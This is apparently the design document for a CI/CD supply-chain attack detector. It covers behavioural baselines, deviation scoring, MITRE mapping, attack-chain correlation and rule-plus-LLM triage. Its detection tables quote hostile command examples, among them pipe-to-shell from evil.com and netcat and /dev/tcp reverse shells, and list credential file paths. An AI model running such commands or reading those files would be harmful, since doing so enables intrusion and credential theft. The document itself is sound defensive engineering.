# Detection Logic

Philip's detection system identifies supply chain attacks in CI/CD pipelines by comparing runtime behavior against learned baselines. This document explains every layer of the detection pipeline, how decisions are made, and how to evolve the system.

## Table of Contents

- [Pipeline Overview](#pipeline-overview)
- [1. Behavioral Baselines](#1-behavioral-baselines)
  - [Learning Phase](#learning-phase)
  - [Profile Types](#profile-types)
  - [Exponential Decay](#exponential-decay)
  - [Profile Pruning](#profile-pruning)
- [2. Deviation Scoring](#2-deviation-scoring)
  - [Deviation Types](#deviation-types)
  - [Static Detection (Learning Mode)](#static-detection-learning-mode)
  - [Baseline-Aware Detection (Active Mode)](#baseline-aware-detection-active-mode)
  - [Scoring Details per Deviation Type](#scoring-details-per-deviation-type)
- [3. MITRE ATT&CK Mapping](#3-mitre-attck-mapping)
- [4. Attack Chain Detection](#4-attack-chain-detection)
- [5. Triage Pipeline (L1 + L2)](#5-triage-pipeline-l1--l2)
  - [L1: Rule-Based Fast Classifier](#l1-rule-based-fast-classifier)
  - [L2: LLM-Powered Deep Analysis](#l2-llm-powered-deep-analysis)
- [6. Severity Calibration](#6-severity-calibration)
- [7. Metrics and Observability](#7-metrics-and-observability)
- [8. Evolving the Detection System](#8-evolving-the-detection-system)

---

## Pipeline Overview

```
Events from Agent (eBPF)
        │
        ▼
┌──────────────────┐
│ Baseline Engine   │ ◄── Updates profiles with each job
│ (learning/active) │     (process, network, file access)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Deviation Scorer  │ ◄── Compares events against baseline
│                   │     Two modes: static-only (learning)
│                   │     or full baseline-aware (active)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ MITRE Enrichment  │ ◄── Maps each deviation to ATT&CK techniques
│ + Severity Calc   │     Suggests severity from score
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Chain Detector    │ ◄── Correlates deviations into multi-step
│                   │     attack patterns (score boost)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐     ┌──────────────────┐
│ L1 Classifier     │────►│ L2 Analyzer (LLM)│
│ (rule-based)      │     │ (deep context)    │
└────────┬─────────┘     └────────┬─────────┘
         │ benign? skip L2        │
         ▼                        ▼
┌──────────────────┐
│ Alert Router      │ ◄── Only high-confidence findings
└──────────────────┘
```

---

## 1. Behavioral Baselines

**Code**: `backend/baseline/`

Philip builds a behavioral profile for each unique `(repository, workflow_file, job_name)` combination. The baseline captures what is "normal" for that specific job.

### Learning Phase

A new baseline starts in **learning** status. During learning:

- The baseline accumulates profiles from each job execution
- After **10 observed jobs** (configurable via `learningThreshold`), the baseline transitions to **active** status
- **Static detection rules still fire during learning** — known-bad patterns (reverse shells, credential theft) are caught even before a baseline is trained

### Profile Types

#### Process Profiles (`ProcessProfile`)

Each unique binary observed during a job gets a profile:

| Field | Purpose |
|-------|---------|
| `BinaryPath` | The executable path (e.g., `/usr/bin/gcc`) |
| `TypicalArgsPatterns` | Raw argument patterns observed |
| `ArgSignatures` | Normalized argument patterns with frequency (e.g., `build -o <path> <path>`) |
| `TypicalParent` | Most common parent process |
| `KnownParents` | All observed parent processes |
| `StepFrequency` | Map of workflow step name → how often this binary runs in that step |
| `Frequency` | How often this binary appears across jobs (0.0–1.0) |

**Arg normalization**: Arguments are normalized to preserve flag structure while stripping variable parts. Paths become `<path>`, versions become `<version>`, hex hashes become `<hash>`, URLs become `<url>`. Known subcommands (e.g., `git clone`, `npm install`) are preserved. This allows detecting anomalous argument patterns like a binary suddenly being invoked with `-c` (inline code execution) when it's normally invoked with `build`.

#### Network Profiles (`NetworkProfile`)

Each unique destination IP gets a profile:

| Field | Purpose |
|-------|---------|
| `DestinationCIDRs` | IP addresses observed |
| `TypicalPorts` | Ports used for this destination |
| `Hostnames` | Reverse DNS hostnames (best-effort) |
| `DomainSuffix` | Top-level domain suffix (e.g., `github.com`) |
| `Frequency` | How often this destination appears across jobs |

**DNS tracking**: When a new IP is first seen, Philip performs a best-effort reverse DNS lookup and records the hostname and domain suffix. This is used during scoring to reduce false positives for trusted domains (e.g., new CDN IPs for `npmjs.org`).

#### File Access Profiles (`FileAccessProfile`)

Each unique normalized path pattern gets a profile:

| Field | Purpose |
|-------|---------|
| `PathPattern` | Normalized path (e.g., `/home/runner/**`) |
| `AccessTypes` | Observed access types: `read`, `write`, `create`, `delete` |
| `BinaryPaths` | Which binaries access this pattern |
| `Frequency` | How often this pattern appears across jobs |

**Path normalization**: File paths are normalized to preserve the first 2 directory levels, replacing deeper paths with globs. This groups similar file accesses together (e.g., all source files under `/home/runner/work/` become `/home/runner/**`).

### Exponential Decay

All profile frequencies use exponential decay (factor: 0.95):

```
decayed = currentFreq × 0.95 + rawFreq × 0.05
```

This means:
- Recent observations are weighted more heavily than old ones
- A binary that used to run every job but hasn't appeared recently will have a decaying frequency
- A binary that appears for the first time in job #50 doesn't get penalized for missing jobs #1–49 once it becomes frequent

Profiles **not seen** in a job also get their frequency decayed, so stale entries naturally diminish over time.

### Profile Pruning

Profiles whose `LastSeen` timestamp is older than **90 days** (configurable) are pruned during each baseline update. This prevents baselines from growing unboundedly and removes profiles from retired dependencies.

---

## 2. Deviation Scoring

**Code**: `backend/detection/scorer.go`

The scorer compares each event in a job against the baseline and produces `ScoredDeviation` objects for anything anomalous.

### Deviation Types

| Type | Weight | Description |
|------|--------|-------------|
| `new_network` | 1.0 | Connection to a never-before-seen IP address |
| `sensitive_path` | 0.9 | Access to credential/secret files |
| `suspicious_args` | 0.85 | Known-dangerous argument patterns (reverse shells, pipe-to-shell) |
| `unexpected_parent` | 0.8 | Process spawned by an unexpected parent |
| `new_process` | 0.7 | Binary never seen in baseline |
| `anomalous_args` | 0.5 | Known binary with unseen argument pattern |
| `new_file` | 0.3 | File access to a new path pattern (0.6 for write/create) |

### Static Detection (Learning Mode)

When the baseline is in learning mode, the scorer applies **static rules only** — these catch known-bad patterns without needing a trained baseline:

1. **Suspicious binaries**: `nc`, `ncat`, `netcat`, `nmap`, `wget`, `base64`, `xxd`, `python`, `python3`, `perl`, `ruby` — always score 1.0
2. **Suspicious argument patterns**: Pipe-to-shell (`curl | bash`), download to `/tmp`, base64 decode, inline Python execution (`python -c`), netcat with exec flag, interactive/reverse shell patterns
3. **High-risk parent → child combos**: Interpreters (`node`, `python`) spawning network tools (`nc`, `nmap`), package managers (`npm`, `pip`) spawning reverse shell tools
4. **Sensitive path access**: `/etc/shadow`, `/.ssh/`, `/proc/self/environ`, `/.aws/credentials`, etc.

Static detections are marked with `StaticOnly: true` so triage can factor in higher false positive rates.

### Baseline-Aware Detection (Active Mode)

When the baseline is active, the scorer runs full comparison:

1. **Process execution scoring**:
   - Binary not in baseline → `new_process` (0.7, boosted to 1.0 for suspicious binaries)
   - Binary in baseline but frequency < 5% → `new_process` (scaled by rarity)
   - Suspicious argument patterns → `suspicious_args` (0.85) — always checked, even for known binaries
   - Arg pattern never seen for this binary → `anomalous_args` (0.5)
   - Rare arg pattern (freq < 5%) → `anomalous_args` (0.3)
   - Parent not in `KnownParents` → `unexpected_parent` (0.8, boosted to 1.0 for high-risk combos)
   - **Step context modifier**: If a binary appears in a workflow step where it's never run before, all deviation scores for that event get a 1.3x boost. Rare step (freq < 10%) gets 1.15x.

2. **Network connection scoring**:
   - New IP → `new_network` (1.0 if non-standard port, else base weight)
   - Known IP but new port → `new_network` (0.6x base weight)
   - **Trusted domain reduction**: If reverse DNS resolves to a trusted domain suffix (github.com, npmjs.org, pypi.org, docker.io, amazonaws.com, etc.), the score is reduced by 50%

3. **File access scoring**:
   - Sensitive path (always-on, static) → `sensitive_path` (0.9)
   - New path pattern → `new_file` (0.3, boosted to 0.6 for write/create)
   - Known pattern but new access type (e.g., read-only path now written to) → `new_file` (0.5)
   - Known pattern but new binary accessing it → `new_file` (0.4)

### Scoring Details per Deviation Type

#### Suspicious Argument Patterns (`suspicious_args`)

These static rules fire for both known and unknown binaries:

| Pattern | Example | Why it's suspicious |
|---------|---------|-------------------|
| Download to /tmp | `curl -o /tmp/payload` | Staged malware payload |
| Pipe-to-shell | `curl https://evil.com \| bash` | Remote code execution |
| Base64 decode | `base64 -d payload.b64` | Obfuscated payload unpacking |
| Python inline | `python3 -c "import os; ..."` | Inline code injection |
| Chmod /tmp | `chmod +x /tmp/payload` | Making staged payload executable |
| Netcat exec | `nc -e /bin/sh 10.0.0.1 4444` | Reverse shell |
| Bash interactive | `bash -i >& /dev/tcp/...` | Reverse shell via bash |

#### High-Risk Parent → Child Combos (`unexpected_parent`)

| Parent Category | Child Category | Why |
|----------------|---------------|-----|
| Interpreters (`node`, `python`, `ruby`, `perl`, `php`) | Network tools (`nc`, `ncat`, `nmap`, `socat`) | Language runtime spawning recon/exfil tools |
| Package managers (`npm`, `pip`, `yarn`, `gem`, `composer`) | Network tools | Malicious install script with network activity |

---

## 3. MITRE ATT&CK Mapping

**Code**: `backend/detection/mitre.go`

Every scored deviation is enriched with MITRE ATT&CK technique IDs. The mapping is context-sensitive — the same deviation type maps to different techniques based on the binary, arguments, and file paths.

| Deviation Context | MITRE Technique(s) |
|-------------------|-------------------|
| New process: `nc`/`ncat`/`netcat` | T1059.004 (Unix Shell), T1571 (Non-Standard Port) |
| New process: `nmap` | T1046 (Network Service Discovery) |
| New process: `wget` | T1105 (Ingress Tool Transfer) |
| New process: `base64`/`xxd` | T1140 (Deobfuscate/Decode) |
| New process: interpreter | T1059 (Command Scripting Interpreter) |
| Suspicious args: pipe-to-shell | T1059.004, T1105 (Ingress Tool Transfer) |
| Suspicious args: `/dev/tcp` | T1059.004, T1041 (Exfiltration Over C2) |
| Suspicious args: download to /tmp | T1105 (Ingress Tool Transfer) |
| Sensitive path: `/.ssh/`, `/.aws/` | T1552.001 (Credentials In Files) |
| Sensitive path: `/proc/self/environ` | T1552.007 (Container API) |
| Sensitive path: `/etc/shadow` | T1552 (Unsecured Credentials) |
| New network: non-standard port | T1571, T1041 (Exfiltration Over C2) |
| New network: standard port | T1041 (Exfiltration Over C2) |
| Unexpected parent: net tools | T1059, T1571 |
| New file: `/etc/`, `.bashrc`, cron | T1546 (Event Triggered Execution) |
| New file: create in `/tmp/` | T1105 (Ingress Tool Transfer) |

---

## 4. Attack Chain Detection

**Code**: `backend/detection/chains.go`

Individual deviations are correlated into multi-step attack patterns. Chains provide higher-confidence alerts because a single anomaly could be benign, but a sequence of related anomalies is much more likely to be malicious.

### Chain Patterns

| Chain Name | Components | Score Boost | Severity |
|-----------|------------|-------------|----------|
| `credential_theft_exfiltration` | sensitive_path + new_network | 1.5x | critical |
| `payload_drop_execution` | write to /tmp + exec from /tmp | 1.4x | critical |
| `reconnaissance_lateral_movement` | network tools (nmap, nc) + connection to unusual ports | 1.3x | high |
| `persistence_installation` | write to .bashrc/cron + shell tools | 1.4x | critical |

### How Chain Detection Works

1. Index all deviations by type
2. For each chain pattern, check if the required deviation types are present
3. Apply additional context checks (e.g., payload_drop requires /tmp paths specifically)
4. If a chain matches, compute a composite score = max individual score × boost factor
5. Aggregate MITRE techniques from all deviations in the chain

A single deviation can appear in multiple chains (e.g., a `sensitive_path` deviation could be in both a credential theft chain and contribute to severity escalation).

---

## 5. Triage Pipeline (L1 + L2)

**Code**: `backend/triage/`

After scoring and chain detection, deviations pass through a two-layer triage pipeline that determines whether to alert.

### L1: Rule-Based Fast Classifier

**Code**: `backend/triage/l1_classifier.go`

L1 is a zero-latency classifier that filters obvious benign deviations and flags obvious attacks without invoking the LLM.

#### Benign Rules (suppress alerts)

| Rule | What it matches | Confidence |
|------|----------------|------------|
| `known_package_manager` | npm, yarn, pip, cargo, go, maven, etc. | 0.95 |
| `known_build_tool` | gcc, g++, clang, rustc, javac, make, cmake, ninja, bazel, etc. | 0.95 |
| `known_test_runner` | pytest, jest, mocha, vitest, ginkgo, etc. | 0.95 |
| `known_ci_tool` | docker, kubectl, helm, terraform, aws, gcloud, gh, jq, etc. | 0.90 |
| `known_linter_formatter` | eslint, prettier, gofmt, golangci-lint, black, rubocop, etc. | 0.95 |
| `safe_package_manager_args` | `npm install`, `pip install -r`, `go mod download` etc. | 0.85 |
| `known_registry_connection` | Connections on port 443/80 | 0.70 |
| `git_operations` | Git binary execution | 0.99 |
| `workspace_file_access` | File access within `/home/runner/`, `/github/workspace/` | 0.90 |
| `tmp_by_package_manager` | Package managers writing to /tmp | 0.85 |
| `cache_dir_access` | Access to `/.cache/`, `/.npm/`, `/.cargo/registry/`, etc. | 0.90 |

**If all deviations match benign rules, L1 returns `benign` and L2 is skipped.**

#### Critical Rules (immediate escalation)

| Rule | What it matches | MITRE | Confidence |
|------|----------------|-------|------------|
| `reverse_shell_pattern` | nc/ncat with -e/-c, `/dev/tcp` or `/dev/udp` in args | T1059.004, T1571 | 0.95 |
| `credential_exfiltration` | Access to `/etc/shadow`, `/.ssh/id_`, `/.aws/credentials` | T1552.001 | 0.90 |
| `environment_dump` | Access to `/proc/self/environ` | T1552.007 | 0.85 |
| `suspicious_args_critical` | `suspicious_args` deviation with score >= 0.85 | T1059.004, T1105 | 0.85 |
| `unexpected_parent_high_risk` | `unexpected_parent` deviation with score >= 0.95 | T1059 | 0.90 |
| `write_to_etc` | Write/create to `/etc/` directory | T1546 | 0.85 |
| `persistence_via_profile` | Write to `.bashrc`, `.profile`, `.zshrc`, `crontab`, `cron.d/` | T1546 | 0.90 |
| `private_key_access` | Access to `.pem`, `.key`, `.p12`, `.pfx` files outside workspace | T1552.001 | 0.85 |

### L2: LLM-Powered Deep Analysis

**Code**: `backend/triage/openai/provider.go`

When L1 can't classify all deviations as benign, L2 sends the full context to an LLM (GPT-4o by default) for deep analysis. The prompt includes:

- Repository name and job ID
- Baseline context (how many jobs observed, known processes/network destinations)
- Each deviation with: score, type, description, binary, args, destination, file path
- Pre-mapped MITRE ATT&CK techniques per deviation
- Suggested severity per deviation
- Whether detection was static-only (no baseline context)
- Detected attack chains with composite scores

The LLM is instructed to:
- **Minimize false positives** — alert fatigue is the #1 enemy
- Confirm, adjust, or add to the pre-mapped MITRE techniques
- Factor in lower confidence for static-only detections
- Consider attack chains in its severity assessment
- Provide actionable recommendations for the security team

---

## 6. Severity Calibration

**Code**: `backend/detection/chains.go` (`SeverityFromChains`)

Final severity is computed considering multiple signals:

| Signal | Effect |
|--------|--------|
| Max deviation score >= 0.9 | critical |
| Max deviation score >= 0.7 | high |
| Max deviation score >= 0.4 | medium |
| Max deviation score < 0.4 | low |
| Attack chains detected | Elevate one level (e.g., high → critical) |
| 3+ distinct MITRE techniques | At least "high" |
| Static-only detections present | At least "medium" |

---

## 7. Metrics and Observability

Philip exposes Prometheus metrics for monitoring detection quality:

| Metric | Type | Description |
|--------|------|-------------|
| `philip_deviations_total` | counter | Total deviations by repo, job, type |
| `philip_deviation_score` | histogram | Score distribution by repo, job, type |
| `philip_static_detections_total` | counter | Static rule detections during learning |
| `philip_attack_chains_total` | counter | Attack chains detected by repo and chain name |
| `philip_triage_verdicts_total` | counter | Triage verdicts by source (l1/l2) and outcome |
| `philip_baseline_profiles_pruned_total` | counter | Stale profiles pruned |
| `philip_baseline_process_profiles` | gauge | Process profiles per baseline |
| `philip_baseline_network_profiles` | gauge | Network profiles per baseline |
| `philip_baseline_file_access_profiles` | gauge | File access profiles per baseline |
| `philip_job_exec_score` | gauge | Highest deviation score per execution |
| `philip_job_exec_verdict` | gauge | Verdict per execution (0=clean to 3=critical) |

---

## 8. Evolving the Detection System

The detection system is designed to be evolved incrementally. Here's how to add new capabilities:

### Adding a New Static Detection Rule

1. **Edit `scorer.go`**: Add a check in `scoreEventStatic()` for the new pattern
2. **Add MITRE mapping**: Update `mitre.go` to map the new deviation to ATT&CK techniques
3. **Add L1 rule**: If the pattern is always benign or always critical, add an L1 rule in `l1_classifier.go`
4. **Test**: Add a test case in `scorer_test.go`

### Adding a New Deviation Type

1. **Define the type**: Add a new `DeviationType` constant in `scorer.go`
2. **Set the weight**: Add it to `deviationWeights`
3. **Implement scoring**: Add a `score*()` method and wire it into `scoreEvent()`
4. **Add MITRE mapping**: Add a case in `MITREForDeviation()` in `mitre.go`
5. **Add L1 rules**: Both benign and critical rules as appropriate
6. **Update chain detection**: If the new type participates in attack chains, update `chains.go`

### Adding a New Attack Chain Pattern

1. **Edit `chains.go`**: Add a new `detect*()` method following the existing pattern
2. **Call it from `DetectChains()`**
3. **Define**: Which deviation types must co-occur, what the score boost is, and the severity

### Adding a New L1 Benign Rule

1. **Edit `l1_classifier.go`**: Add to `defaultL1Rules()`
2. **Test**: Verify that the rule matches expected inputs and doesn't suppress true positives
3. **Set confidence**: Lower confidence (0.7–0.8) if the rule could occasionally suppress real attacks

### Adding a New Trusted Domain

1. **Edit `scorer.go`**: Add the domain to `trustedDomainSuffixes` map
2. This will reduce network deviation scores by 50% for IPs resolving to that domain

### Configurable Lists

The `ScorerConfig` struct in `config.go` defines all configurable lists:
- `SuspiciousBinaries` — binaries that always trigger high scores
- `SensitivePaths` — file paths that always trigger sensitive_path deviations
- `CommonPorts` — ports that don't trigger non-standard-port scoring
- `TrustedDomainSuffixes` — domains that reduce network deviation scores

These can be loaded from external config in future iterations.

### Key Design Principles

1. **Static rules are the safety net** — they catch attacks even during baseline learning
2. **Baselines are per-job, not per-repo** — different jobs have different behaviors
3. **Exponential decay keeps baselines fresh** — old behaviors naturally age out
4. **Score composition, not thresholds** — individual scores are weights, not binary decisions
5. **Chains elevate confidence** — correlated anomalies are much more suspicious than isolated ones
6. **L1 reduces noise, L2 adds context** — most events never reach the LLM
7. **MITRE mapping is pre-computed** — the LLM confirms rather than derives from scratch
